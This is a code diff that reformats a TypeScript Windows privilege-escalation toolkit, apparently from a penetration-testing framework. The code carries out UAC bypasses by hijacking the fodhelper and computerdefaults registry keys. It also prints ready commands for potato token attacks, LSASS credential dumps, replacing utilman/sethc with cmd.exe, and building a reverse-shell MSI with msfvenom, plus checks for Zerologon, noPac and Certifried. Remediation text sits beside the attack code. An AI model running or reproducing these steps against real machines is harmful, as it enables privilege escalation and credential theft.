@@ -30,7 +30,16 @@ export async function tokenImpersonate(args: string[], timeout: number): Promise
       output.push("    PrintSpoofer.exe -i -c cmd.exe")
       output.push("    GodPotato.exe -cmd cmd.exe")
       output.push("    JuicyPotatoNG.exe -t * -p cmd.exe")
-      findings.push({ checkId: "WIN-TOKEN-001", provider: "windows", severity: "critical", status: "ENUMERATED", resource: "token://impersonate", title: "SeImpersonatePrivilege enabled — SYSTEM escalation viable", details: "Use PrintSpoofer/GodPotato/JuicyPotato for SYSTEM token theft", remediation: "Remove SeImpersonatePrivilege from service accounts" })
+      findings.push({
+        checkId: "WIN-TOKEN-001",
+        provider: "windows",
+        severity: "critical",
+        status: "ENUMERATED",
+        resource: "token://impersonate",
+        title: "SeImpersonatePrivilege enabled — SYSTEM escalation viable",
+        details: "Use PrintSpoofer/GodPotato/JuicyPotato for SYSTEM token theft",
+        remediation: "Remove SeImpersonatePrivilege from service accounts",
+      })
     }
     return { output: output.join("\n"), findings }
   }
@@ -254,10 +263,23 @@ export async function uacBypass(args: string[], timeout: number): Promise<HookRe
       await cmd(`reg add "${regPath}" /v DelegateExecute /d "" /f`, timeout)
       output.push("[+] Registry keys set, launching fodhelper.exe...")
       const r = await cmd("start fodhelper.exe", timeout)
-      output.push(r.exitCode === 0 ? "[+] fodhelper.exe launched — elevated command should execute" : `[!] Launch failed: ${r.stderr}`)
+      output.push(
+        r.exitCode === 0
+          ? "[+] fodhelper.exe launched — elevated command should execute"
+          : `[!] Launch failed: ${r.stderr}`,
+      )
       await cmd(`reg delete "${regPath}" /f 2>nul`, timeout)
       output.push("[+] Registry cleaned up")
-      findings.push({ checkId: "WIN-UAC-001", provider: "windows", severity: "high", status: "EXECUTED", resource: "uac://fodhelper", title: "UAC bypass via fodhelper.exe (cmd.exe)", details: `Elevated: ${command}`, remediation: "Set UAC to Always Notify. Monitor ms-settings registry keys." })
+      findings.push({
+        checkId: "WIN-UAC-001",
+        provider: "windows",
+        severity: "high",
+        status: "EXECUTED",
+        resource: "uac://fodhelper",
+        title: "UAC bypass via fodhelper.exe (cmd.exe)",
+        details: `Elevated: ${command}`,
+        remediation: "Set UAC to Always Notify. Monitor ms-settings registry keys.",
+      })
     } else if (method === "computerdefaults") {
       const regPath = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
       await cmd(`reg add "${regPath}" /ve /d "${command}" /f`, timeout)
@@ -265,7 +287,16 @@ export async function uacBypass(args: string[], timeout: number): Promise<HookRe
       const r = await cmd("start computerdefaults.exe", timeout)
       output.push(r.exitCode === 0 ? "[+] computerdefaults.exe launched" : `[!] Failed: ${r.stderr}`)
       await cmd(`reg delete "${regPath}" /f 2>nul`, timeout)
-      findings.push({ checkId: "WIN-UAC-002", provider: "windows", severity: "high", status: "EXECUTED", resource: "uac://computerdefaults", title: "UAC bypass via computerdefaults.exe (cmd.exe)", details: `Elevated: ${command}`, remediation: "Set UAC to Always Notify" })
+      findings.push({
+        checkId: "WIN-UAC-002",
+        provider: "windows",
+        severity: "high",
+        status: "EXECUTED",
+        resource: "uac://computerdefaults",
+        title: "UAC bypass via computerdefaults.exe (cmd.exe)",
+        details: `Elevated: ${command}`,
+        remediation: "Set UAC to Always Notify",
+      })
     } else if (method === "sdclt") {
       await cmd(`reg add "HKCU\\Software\\Classes\\Folder\\shell\\open\\command" /ve /d "${command}" /f`, timeout)
       await cmd(`reg add "HKCU\\Software\\Classes\\Folder\\shell\\open\\command" /v DelegateExecute /d "" /f`, timeout)
@@ -419,7 +450,16 @@ export async function potatoAttack(args: string[], timeout: number): Promise<Hoo
     output.push(`\n[*] CLSID for JuicyPotato: ${clsid}`)
     const ver = await cmd("ver", timeout)
     output.push(`[*] OS: ${ver.stdout.trim()}`)
-    findings.push({ checkId: "WIN-POTATO-001", provider: "windows", severity: "critical", status: "ENUMERATED", resource: "token://potato", title: `Potato attack viable (${method}) — SeImpersonatePrivilege enabled`, details: `Target command: ${command}`, remediation: "Remove SeImpersonatePrivilege from service accounts" })
+    findings.push({
+      checkId: "WIN-POTATO-001",
+      provider: "windows",
+      severity: "critical",
+      status: "ENUMERATED",
+      resource: "token://potato",
+      title: `Potato attack viable (${method}) — SeImpersonatePrivilege enabled`,
+      details: `Target command: ${command}`,
+      remediation: "Remove SeImpersonatePrivilege from service accounts",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -637,12 +677,18 @@ export async function printspoolerAbuse(args: string[], timeout: number): Promis
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== Print Spooler Abuse (cmd.exe) ===\n")
     const svc = await cmd("sc query Spooler", timeout)
-    output.push(svc.stdout.includes("RUNNING") ? "[+] Print Spooler service: RUNNING" : "[!] Print Spooler: NOT RUNNING")
+    output.push(
+      svc.stdout.includes("RUNNING") ? "[+] Print Spooler service: RUNNING" : "[!] Print Spooler: NOT RUNNING",
+    )
     if (!svc.stdout.includes("RUNNING")) return { output: output.join("\n"), findings }
     output.push("[!] PrintNightmare / SpoolFool requires P/Invoke — cmd provides recon only\n")
     output.push("[*] Checking Print Spooler exposure:")
     const rpcdump = await cmd(`dir \\\\${target}\\print$\\ 2>nul`, timeout)
-    output.push(rpcdump.exitCode === 0 ? `[+] print$ share accessible on ${target}` : `[-] print$ share not accessible on ${target}`)
+    output.push(
+      rpcdump.exitCode === 0
+        ? `[+] print$ share accessible on ${target}`
+        : `[-] print$ share not accessible on ${target}`,
+    )
     const drivers = await cmd("wmic printer get Name,DriverName,PortName /format:list", timeout)
     output.push(`\n[*] Installed printers:\n${drivers.stdout.trim() || "    None"}`)
     output.push("\n[*] Exploitation tools (external):")
@@ -651,8 +697,21 @@ export async function printspoolerAbuse(args: string[], timeout: number): Promis
     output.push(`    SpoolSample.exe ${target} attacker`)
     output.push(`    PrintSpoofer.exe -i -c cmd.exe  (local SYSTEM)`)
     const patch = await cmd('wmic qfe get HotFixID | findstr /i "KB5005010 KB5005568 KB5005033"', timeout)
-    output.push(patch.stdout.trim() ? `\n[*] PrintNightmare patches installed: ${patch.stdout.trim()}` : "\n[!] PrintNightmare patches NOT detected — may be vulnerable")
-    findings.push({ checkId: "WIN-SPOOLER-001", provider: "windows", severity: "high", status: "ENUMERATED", resource: `spooler://${target}`, title: `Print Spooler running on ${target}`, details: "Print Spooler service active — check for PrintNightmare patches", remediation: "Disable Print Spooler if not needed. Apply KB5005010." })
+    output.push(
+      patch.stdout.trim()
+        ? `\n[*] PrintNightmare patches installed: ${patch.stdout.trim()}`
+        : "\n[!] PrintNightmare patches NOT detected — may be vulnerable",
+    )
+    findings.push({
+      checkId: "WIN-SPOOLER-001",
+      provider: "windows",
+      severity: "high",
+      status: "ENUMERATED",
+      resource: `spooler://${target}`,
+      title: `Print Spooler running on ${target}`,
+      details: "Print Spooler service active — check for PrintNightmare patches",
+      remediation: "Disable Print Spooler if not needed. Apply KB5005010.",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -797,8 +856,22 @@ export async function nopac(args: string[], timeout: number): Promise<HookResult
       const nltest = await cmd("nltest /dsgetdc:", timeout)
       output.push(nltest.stdout.trim() ? `[+] Domain Controller:\n${nltest.stdout}` : "[!] Cannot reach DC")
       const patch = await cmd('wmic qfe get HotFixID | findstr /i "KB5008380 KB5008602"', timeout)
-      output.push(patch.stdout.trim() ? `[*] noPac patches found: ${patch.stdout.trim()}` : "[!] noPac patches NOT detected (CVE-2021-42278/42287 may be exploitable)")
-      if (!patch.stdout.trim()) findings.push({ checkId: "WIN-NOPAC-001", provider: "windows", severity: "critical", status: "ENUMERATED", resource: "ad://nopac", title: "noPac patches not detected — SAMAccountName spoofing may be possible", details: "KB5008380/KB5008602 not found", remediation: "Install November 2021 patches" })
+      output.push(
+        patch.stdout.trim()
+          ? `[*] noPac patches found: ${patch.stdout.trim()}`
+          : "[!] noPac patches NOT detected (CVE-2021-42278/42287 may be exploitable)",
+      )
+      if (!patch.stdout.trim())
+        findings.push({
+          checkId: "WIN-NOPAC-001",
+          provider: "windows",
+          severity: "critical",
+          status: "ENUMERATED",
+          resource: "ad://nopac",
+          title: "noPac patches not detected — SAMAccountName spoofing may be possible",
+          details: "KB5008380/KB5008602 not found",
+          remediation: "Install November 2021 patches",
+        })
     }
     output.push("\n[*] noPac exploitation tools:")
     output.push("    noPac.exe scan -domain X -user Y -pass Z")
@@ -1006,11 +1079,24 @@ export async function zerologon(args: string[], timeout: number): Promise<HookRe
     output.push("=== Zerologon Check (cmd.exe) ===\n")
     output.push("[!] Zerologon exploit requires Netlogon P/Invoke — cmd provides patch check only\n")
     const patch = await cmd('wmic qfe get HotFixID | findstr /i "KB4571694 KB4577051 KB4577015 KB4571756"', timeout)
-    output.push(patch.stdout.trim() ? `[*] Zerologon patches found: ${patch.stdout.trim()}` : "[!] Zerologon patches NOT detected (CVE-2020-1472 may be exploitable)")
+    output.push(
+      patch.stdout.trim()
+        ? `[*] Zerologon patches found: ${patch.stdout.trim()}`
+        : "[!] Zerologon patches NOT detected (CVE-2020-1472 may be exploitable)",
+    )
     const nltest = await cmd(`nltest /sc_query:${dc}`, timeout)
     output.push(`\n[*] Secure channel to ${dc}:\n${nltest.stdout}`)
     if (!patch.stdout.trim()) {
-      findings.push({ checkId: "WIN-ZEROLOGON-001", provider: "windows", severity: "critical", status: "ENUMERATED", resource: `dc://${dc}`, title: "Zerologon patches not detected", details: "CVE-2020-1472 — may allow DC machine account password zeroing", remediation: "Install August 2020 patches" })
+      findings.push({
+        checkId: "WIN-ZEROLOGON-001",
+        provider: "windows",
+        severity: "critical",
+        status: "ENUMERATED",
+        resource: `dc://${dc}`,
+        title: "Zerologon patches not detected",
+        details: "CVE-2020-1472 — may allow DC machine account password zeroing",
+        remediation: "Install August 2020 patches",
+      })
     }
     output.push("\n[*] Exploitation tools:")
     output.push(`    zerologon_tester.py ${dc} ${dc}`)
@@ -1225,12 +1311,24 @@ export async function certifried(args: string[], timeout: number): Promise<HookR
 
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== Certifried Check (cmd.exe) ===\n")
-    const regCheck = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc" /v StrongCertificateBindingEnforcement 2>nul', timeout)
+    const regCheck = await cmd(
+      'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc" /v StrongCertificateBindingEnforcement 2>nul',
+      timeout,
+    )
     const val = regCheck.stdout.match(/StrongCertificateBindingEnforcement\s+REG_DWORD\s+0x(\d+)/)?.[1]
     output.push(`StrongCertificateBindingEnforcement: ${val === undefined ? "Not set (default=1)" : val}`)
     if (val === "0") {
       output.push("[!] VULNERABLE — certificate mapping enforcement is DISABLED")
-      findings.push({ checkId: "WIN-CERTIFRIED-001", provider: "windows", severity: "critical", status: "ENUMERATED", resource: "ad://certifried", title: "Certifried (CVE-2022-26923) — enforcement disabled", details: "StrongCertificateBindingEnforcement=0", remediation: "Set StrongCertificateBindingEnforcement to 1 or 2" })
+      findings.push({
+        checkId: "WIN-CERTIFRIED-001",
+        provider: "windows",
+        severity: "critical",
+        status: "ENUMERATED",
+        resource: "ad://certifried",
+        title: "Certifried (CVE-2022-26923) — enforcement disabled",
+        details: "StrongCertificateBindingEnforcement=0",
+        remediation: "Set StrongCertificateBindingEnforcement to 1 or 2",
+      })
     }
     const patch = await cmd('wmic qfe get HotFixID | findstr /i "KB5014754"', timeout)
     output.push(patch.stdout.trim() ? `[*] Certifried patch: ${patch.stdout.trim()}` : "[!] KB5014754 not detected")
@@ -1461,13 +1559,16 @@ export async function badSuccessor(args: string[], timeout: number): Promise<Hoo
     output.push("[!] dMSA exploitation requires LDAP/PS. cmd provides recon only.\n")
     const nltest = await cmd("nltest /dsgetdc:", timeout)
     output.push(nltest.stdout.trim() ? `[+] DC info:\n${nltest.stdout}` : "[!] Cannot reach DC")
-    const funcLevel = await cmd('dsquery * "cn=Partitions,cn=Configuration,dc=*" -scope base -attr msDS-Behavior-Version 2>nul', timeout)
+    const funcLevel = await cmd(
+      'dsquery * "cn=Partitions,cn=Configuration,dc=*" -scope base -attr msDS-Behavior-Version 2>nul',
+      timeout,
+    )
     output.push(`[*] Domain functional level query:\n${funcLevel.stdout.trim() || "dsquery not available"}`)
     output.push("\n[*] CVE-2025-53779 requires:")
     output.push("    - Windows Server 2025 domain functional level (level 10)")
     output.push("    - CreateChild permission on an OU")
     output.push("    - dMSA (delegated Managed Service Account) support")
-    output.push("\n[*] Check with: dsquery * -filter \"(objectClass=msDS-ManagedServiceAccount)\" -attr cn")
+    output.push('\n[*] Check with: dsquery * -filter "(objectClass=msDS-ManagedServiceAccount)" -attr cn')
     output.push("\n[*] Tools: BadSuccessor.py, impacket-addcomputer")
     return { output: output.join("\n"), findings }
   }
@@ -1709,9 +1810,18 @@ export async function privilegeAbuse(args: string[], timeout: number): Promise<H
       output.push(`[+] Current privileges:\n${priv.stdout}`)
       const groups = await cmd("whoami /groups", timeout)
       output.push(`\n[+] Group memberships:\n${groups.stdout}`)
-      const abusable = ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege",
-        "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege",
-        "SeLoadDriverPrivilege", "SeManageVolumePrivilege", "SeCreateTokenPrivilege", "SeTcbPrivilege"]
+      const abusable = [
+        "SeImpersonatePrivilege",
+        "SeAssignPrimaryTokenPrivilege",
+        "SeDebugPrivilege",
+        "SeBackupPrivilege",
+        "SeRestorePrivilege",
+        "SeTakeOwnershipPrivilege",
+        "SeLoadDriverPrivilege",
+        "SeManageVolumePrivilege",
+        "SeCreateTokenPrivilege",
+        "SeTcbPrivilege",
+      ]
       output.push("\n[*] Abusable privilege reference:")
       for (const p of abusable) {
         if (priv.stdout.includes(p)) {
@@ -1722,7 +1832,7 @@ export async function privilegeAbuse(args: string[], timeout: number): Promise<H
     }
     if (action === "exploit" && privilege === "SeDebugPrivilege") {
       output.push("[*] SeDebugPrivilege exploitation (cmd):")
-      output.push("    tasklist /fi \"imagename eq lsass.exe\"")
+      output.push('    tasklist /fi "imagename eq lsass.exe"')
       output.push("    rundll32.exe comsvcs.dll,MiniDump <PID> dump.bin full")
       output.push("    Or use: procdump.exe -accepteula -ma lsass.exe lsass.dmp")
     }
@@ -1735,14 +1845,14 @@ export async function privilegeAbuse(args: string[], timeout: number): Promise<H
     }
     if (action === "exploit" && privilege === "SeRestorePrivilege") {
       output.push("[*] SeRestorePrivilege — replace accessibility binaries:")
-      output.push('    copy /y cmd.exe %SystemRoot%\\System32\\utilman.exe')
-      output.push('    copy /y cmd.exe %SystemRoot%\\System32\\sethc.exe')
+      output.push("    copy /y cmd.exe %SystemRoot%\\System32\\utilman.exe")
+      output.push("    copy /y cmd.exe %SystemRoot%\\System32\\sethc.exe")
       output.push("    Then: Lock screen → press Shift 5x or Win+U → SYSTEM shell")
     }
     if (action === "exploit" && privilege === "SeTakeOwnershipPrivilege") {
       output.push("[*] SeTakeOwnershipPrivilege exploitation:")
-      output.push(`    takeown /f "${target || 'C:\\path\\to\\target'}" /r /d y`)
-      output.push(`    icacls "${target || 'C:\\path\\to\\target'}" /grant %username%:F /t`)
+      output.push(`    takeown /f "${target || "C:\\path\\to\\target"}" /r /d y`)
+      output.push(`    icacls "${target || "C:\\path\\to\\target"}" /grant %username%:F /t`)
     }
     return { output: output.join("\n"), findings }
   }
@@ -2075,15 +2185,23 @@ export async function namedPipePrivesc(args: string[], timeout: number): Promise
     output.push("=== Named Pipe Privesc (cmd.exe) ===\n")
     const priv = await cmd("whoami /priv", timeout)
     output.push(`[+] Privilege check:\n${priv.stdout}`)
-    const hasImpersonate = priv.stdout.includes("SeImpersonatePrivilege") && priv.stdout.match(/SeImpersonatePrivilege\s+.*Enabled/)
+    const hasImpersonate =
+      priv.stdout.includes("SeImpersonatePrivilege") && priv.stdout.match(/SeImpersonatePrivilege\s+.*Enabled/)
     output.push(`[*] SeImpersonatePrivilege: ${hasImpersonate ? "[+] ENABLED" : "[-] Disabled/Missing"}`)
     if (action === "enum") {
-      const pipes = await cmd('dir /b \\\\.\\pipe\\', timeout)
+      const pipes = await cmd("dir /b \\\\.\\pipe\\", timeout)
       const interesting = ["spoolss", "efsrpc", "lsarpc", "samr", "netlogon", "srvsvc", "wkssvc", "browser", "atsvc"]
-      const found = interesting.filter(p => pipes.stdout.toLowerCase().includes(p))
+      const found = interesting.filter((p) => pipes.stdout.toLowerCase().includes(p))
       output.push(`\n[*] Interesting named pipes found: ${found.length > 0 ? found.join(", ") : "none"}`)
       output.push(`\n[*] All pipes (${pipes.stdout.split("\n").filter(Boolean).length} total):`)
-      output.push(pipes.stdout.split("\n").filter(Boolean).slice(0, 30).map(p => `    ${p}`).join("\n"))
+      output.push(
+        pipes.stdout
+          .split("\n")
+          .filter(Boolean)
+          .slice(0, 30)
+          .map((p) => `    ${p}`)
+          .join("\n"),
+      )
     }
     if (action === "exploit") {
       output.push("\n[*] Named pipe exploitation requires compiled tools:")
@@ -2377,14 +2495,29 @@ export async function alwaysInstallElevated(args: string[], timeout: number): Pr
 
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== AlwaysInstallElevated (cmd.exe) ===\n")
-    const hklm = await cmd('reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul', timeout)
-    const hkcu = await cmd('reg query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul', timeout)
+    const hklm = await cmd(
+      'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul',
+      timeout,
+    )
+    const hkcu = await cmd(
+      'reg query "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" /v AlwaysInstallElevated 2>nul',
+      timeout,
+    )
     const hklmSet = hklm.stdout.includes("0x1")
     const hkcuSet = hkcu.stdout.includes("0x1")
     output.push(`[*] HKLM AlwaysInstallElevated: ${hklmSet ? "[!] ENABLED (0x1)" : "[-] Not set / disabled"}`)
     output.push(`[*] HKCU AlwaysInstallElevated: ${hkcuSet ? "[!] ENABLED (0x1)" : "[-] Not set / disabled"}`)
     if (hklmSet && hkcuSet) {
-      findings.push({ checkId: "WIN-AIE-CMD", provider: "windows", severity: "critical", status: "FAIL", resource: "registry://AlwaysInstallElevated", title: "AlwaysInstallElevated Enabled", details: "Both HKLM and HKCU keys set to 1 — any user can install MSI as SYSTEM", remediation: "Set AlwaysInstallElevated to 0 in both HKLM and HKCU" })
+      findings.push({
+        checkId: "WIN-AIE-CMD",
+        provider: "windows",
+        severity: "critical",
+        status: "FAIL",
+        resource: "registry://AlwaysInstallElevated",
+        title: "AlwaysInstallElevated Enabled",
+        details: "Both HKLM and HKCU keys set to 1 — any user can install MSI as SYSTEM",
+        remediation: "Set AlwaysInstallElevated to 0 in both HKLM and HKCU",
+      })
       output.push("\n[!] VULNERABLE — Both keys enabled!")
       output.push("[*] Exploit: msiexec /quiet /qn /i malicious.msi")
       output.push("[*] Generate: msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=y -f msi -o evil.msi")
@@ -2507,12 +2640,18 @@ export async function shadowCopyAbuse(args: string[], timeout: number): Promise<
     output.push("=== Shadow Copy Abuse (cmd.exe) ===\n")
     if (action === "enum") {
       const shadows = await cmd("vssadmin list shadows 2>nul", timeout)
-      output.push(`[*] Volume Shadow Copies:\n${shadows.stdout.trim() || "[-] No shadow copies or vssadmin unavailable"}`)
+      output.push(
+        `[*] Volume Shadow Copies:\n${shadows.stdout.trim() || "[-] No shadow copies or vssadmin unavailable"}`,
+      )
       const wmic = await cmd("wmic shadowcopy list brief 2>nul", timeout)
       if (wmic.stdout.trim()) output.push(`\n[*] WMIC shadow list:\n${wmic.stdout}`)
       output.push("\n[*] Checking HiveNightmare/SeriousSAM (CVE-2021-36934):")
       const sam = await cmd("icacls %SystemRoot%\\System32\\config\\SAM 2>nul", timeout)
-      output.push(sam.stdout.includes("BUILTIN\\Users") ? "[!] SAM readable by BUILTIN\\Users — VULNERABLE!" : "[-] SAM ACL appears normal")
+      output.push(
+        sam.stdout.includes("BUILTIN\\Users")
+          ? "[!] SAM readable by BUILTIN\\Users — VULNERABLE!"
+          : "[-] SAM ACL appears normal",
+      )
     }
     if (action === "create") {
       output.push("[*] Creating shadow copy:")
@@ -2741,9 +2880,12 @@ export async function unquotedServicePath(args: string[], timeout: number): Prom
   if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
     output.push("=== Unquoted Service Path (cmd.exe) ===\n")
     if (action === "enum") {
-      const result = await cmd('wmic service get name,displayname,pathname,startmode 2>nul | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """', timeout)
+      const result = await cmd(
+        'wmic service get name,displayname,pathname,startmode 2>nul | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """',
+        timeout,
+      )
       output.push("[*] Services with potentially unquoted paths:")
-      const lines = result.stdout.split("\n").filter(l => l.trim() && l.includes(" "))
+      const lines = result.stdout.split("\n").filter((l) => l.trim() && l.includes(" "))
       for (const line of lines) {
         const path = line.match(/\s([A-Z]:\\[^\r\n]+)/i)?.[1]?.trim()
         if (path && path.includes(" ") && !path.startsWith('"')) {
@@ -3195,20 +3337,34 @@ export async function scheduledTaskHijack(args: string[], timeout: number): Prom
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== Scheduled Task Hijack (cmd.exe) ===\n")
     if (action === "enum") {
-      const tasks = await cmd('schtasks /query /v /fo csv 2>nul', timeout)
-      const lines = tasks.stdout.split("\n").filter(l => l.includes("SYSTEM") || l.includes("LOCAL SERVICE") || l.includes("Administrators"))
+      const tasks = await cmd("schtasks /query /v /fo csv 2>nul", timeout)
+      const lines = tasks.stdout
+        .split("\n")
+        .filter((l) => l.includes("SYSTEM") || l.includes("LOCAL SERVICE") || l.includes("Administrators"))
       output.push(`[*] Privileged scheduled tasks: ${lines.length} found`)
       for (const line of lines.slice(0, 20)) {
-        const cols = line.split('","').map(c => c.replace(/"/g, ""))
+        const cols = line.split('","').map((c) => c.replace(/"/g, ""))
         const taskName = cols[1] || "unknown"
         const exe = cols[8] || ""
         if (exe && !exe.toLowerCase().startsWith("c:\\windows\\")) {
           output.push(`\n[!] Task: ${taskName}`)
           output.push(`    Binary: ${exe}`)
           const acl = await cmd(`icacls "${exe}" 2>nul`, timeout)
-          const writable = acl.stdout.includes("BUILTIN\\Users") && (acl.stdout.includes("(F)") || acl.stdout.includes("(M)") || acl.stdout.includes("(W)"))
+          const writable =
+            acl.stdout.includes("BUILTIN\\Users") &&
+            (acl.stdout.includes("(F)") || acl.stdout.includes("(M)") || acl.stdout.includes("(W)"))
           output.push(writable ? "    [!] WRITABLE by current user!" : "    [-] Not writable")
-          if (writable) findings.push({ checkId: "WIN-SCHTASK-CMD", provider: "windows", severity: "high", status: "FAIL", resource: `task://${taskName}`, title: `Hijackable task: ${taskName}`, details: `Binary ${exe} is writable by BUILTIN\\Users`, remediation: "Restrict write permissions on the task binary" })
+          if (writable)
+            findings.push({
+              checkId: "WIN-SCHTASK-CMD",
+              provider: "windows",
+              severity: "high",
+              status: "FAIL",
+              resource: `task://${taskName}`,
+              title: `Hijackable task: ${taskName}`,
+              details: `Binary ${exe} is writable by BUILTIN\\Users`,
+              remediation: "Restrict write permissions on the task binary",
+            })
         }
       }
     }
@@ -3414,21 +3570,59 @@ export async function byovd(args: string[], timeout: number): Promise<HookResult
       output.push("[*] Loaded drivers (first 30):")
       const lines = drivers.stdout.split("\n").filter(Boolean).slice(0, 30)
       for (const l of lines) output.push(`    ${l.substring(0, 120)}`)
-      const vulnNames = ["RTCore64", "DBUtil_2_3", "GIGABYTE", "AsIO64", "WinRing0", "cpuz141", "speedfan", "Ene.sys", "HWiNFO", "inpoutx64", "AsrDrv", "gdrv", "MsIo64", "PROCEXP152", "zemana"]
+      const vulnNames = [
+        "RTCore64",
+        "DBUtil_2_3",
+        "GIGABYTE",
+        "AsIO64",
+        "WinRing0",
+        "cpuz141",
+        "speedfan",
+        "Ene.sys",
+        "HWiNFO",
+        "inpoutx64",
+        "AsrDrv",
+        "gdrv",
+        "MsIo64",
+        "PROCEXP152",
+        "zemana",
+      ]
       output.push("\n[*] Scanning for known vulnerable drivers on disk...")
       for (const name of vulnNames) {
         const search = await cmd(`dir /s /b C:\\Windows\\System32\\drivers\\${name}* 2>nul`, timeout)
         if (search.stdout.trim()) {
           output.push(`[!] FOUND: ${search.stdout.trim()}`)
-          findings.push({ checkId: "WIN-BYOVD-CMD", provider: "windows", severity: "high", status: "FAIL", resource: `driver://${name}`, title: `Vulnerable driver: ${name}`, details: `LOLDrivers entry found at ${search.stdout.trim()}`, remediation: "Remove the vulnerable driver and enable HVCI / driver blocklist" })
+          findings.push({
+            checkId: "WIN-BYOVD-CMD",
+            provider: "windows",
+            severity: "high",
+            status: "FAIL",
+            resource: `driver://${name}`,
+            title: `Vulnerable driver: ${name}`,
+            details: `LOLDrivers entry found at ${search.stdout.trim()}`,
+            remediation: "Remove the vulnerable driver and enable HVCI / driver blocklist",
+          })
         }
       }
       const ci = await cmd("bcdedit /enum {current} 2>nul", timeout)
-      if (ci.stdout.includes("testsigning") && ci.stdout.includes("Yes")) output.push("\n[!] Test signing ENABLED — unsigned drivers can be loaded")
-      const hvci = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity" /v Enabled 2>nul', timeout)
-      output.push(hvci.stdout.includes("0x1") ? "\n[-] HVCI enabled — driver exploitation harder" : "\n[*] HVCI not enabled — vulnerable drivers can be loaded")
-      const blocklist = await cmd('reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config" /v VulnerableDriverBlocklistEnable 2>nul', timeout)
-      output.push(blocklist.stdout.includes("0x1") ? "[*] MS driver blocklist: ENABLED" : "[*] MS driver blocklist: NOT enabled")
+      if (ci.stdout.includes("testsigning") && ci.stdout.includes("Yes"))
+        output.push("\n[!] Test signing ENABLED — unsigned drivers can be loaded")
+      const hvci = await cmd(
+        'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity" /v Enabled 2>nul',
+        timeout,
+      )
+      output.push(
+        hvci.stdout.includes("0x1")
+          ? "\n[-] HVCI enabled — driver exploitation harder"
+          : "\n[*] HVCI not enabled — vulnerable drivers can be loaded",
+      )
+      const blocklist = await cmd(
+        'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config" /v VulnerableDriverBlocklistEnable 2>nul',
+        timeout,
+      )
+      output.push(
+        blocklist.stdout.includes("0x1") ? "[*] MS driver blocklist: ENABLED" : "[*] MS driver blocklist: NOT enabled",
+      )
     }
     if (action === "load" && driver) {
       output.push(`[*] Loading driver: ${driver}`)
@@ -3713,8 +3907,8 @@ export async function weakServicePerms(args: string[], timeout: number): Promise
   if (activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") {
     output.push("=== Weak Service Permissions (cmd.exe) ===\n")
     if (action === "enum") {
-      const svcs = await cmd('wmic service get name,pathname,startmode,startname /format:csv 2>nul', timeout)
-      const lines = svcs.stdout.split("\n").filter(l => l.trim() && !l.startsWith("Node"))
+      const svcs = await cmd("wmic service get name,pathname,startmode,startname /format:csv 2>nul", timeout)
+      const lines = svcs.stdout.split("\n").filter((l) => l.trim() && !l.startsWith("Node"))
       output.push(`[*] Scanning ${lines.length} services...`)
       let vulnCount = 0
       for (const line of lines) {
@@ -3725,13 +3919,24 @@ export async function weakServicePerms(args: string[], timeout: number): Promise
         let exe = path.startsWith('"') ? path.match(/"([^"]+)"/)?.[1] : path.split(" ")[0]
         if (!exe) continue
         const acl = await cmd(`icacls "${exe}" 2>nul`, timeout)
-        const writable = acl.stdout.includes("BUILTIN\\Users") && (acl.stdout.includes("(F)") || acl.stdout.includes("(M)") || acl.stdout.includes("(W)"))
+        const writable =
+          acl.stdout.includes("BUILTIN\\Users") &&
+          (acl.stdout.includes("(F)") || acl.stdout.includes("(M)") || acl.stdout.includes("(W)"))
         if (writable) {
           vulnCount++
           output.push(`\n[!] VULN: ${name}`)
           output.push(`    Binary: ${exe}`)
           output.push(`    Permissions: writable by BUILTIN\\Users`)
-          findings.push({ checkId: "WIN-WEAKSVC-CMD", provider: "windows", severity: "high", status: "FAIL", resource: `service://${name}`, title: `Writable service binary: ${name}`, details: `${exe} is writable`, remediation: "Restrict write permissions on the service binary" })
+          findings.push({
+            checkId: "WIN-WEAKSVC-CMD",
+            provider: "windows",
+            severity: "high",
+            status: "FAIL",
+            resource: `service://${name}`,
+            title: `Writable service binary: ${name}`,
+            details: `${exe} is writable`,
+            remediation: "Restrict write permissions on the service binary",
+          })
         }
         const sd = await cmd(`sc sdshow "${name}" 2>nul`, timeout)
         if (sd.stdout.includes("(A;;RPWP") || sd.stdout.includes("(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO")) {
@@ -3984,11 +4189,23 @@ export async function dllSideload(args: string[], timeout: number): Promise<Hook
         const exists = await cmd(`dir "${t.path}\\${t.dll}" 2>nul`, timeout)
         if (!exists.stdout.includes(t.dll)) {
           const dirAcl = await cmd(`icacls "${t.path}" 2>nul`, timeout)
-          const writable = dirAcl.stdout.includes("BUILTIN\\Users") && (dirAcl.stdout.includes("(W)") || dirAcl.stdout.includes("(M)") || dirAcl.stdout.includes("(F)"))
+          const writable =
+            dirAcl.stdout.includes("BUILTIN\\Users") &&
+            (dirAcl.stdout.includes("(W)") || dirAcl.stdout.includes("(M)") || dirAcl.stdout.includes("(F)"))
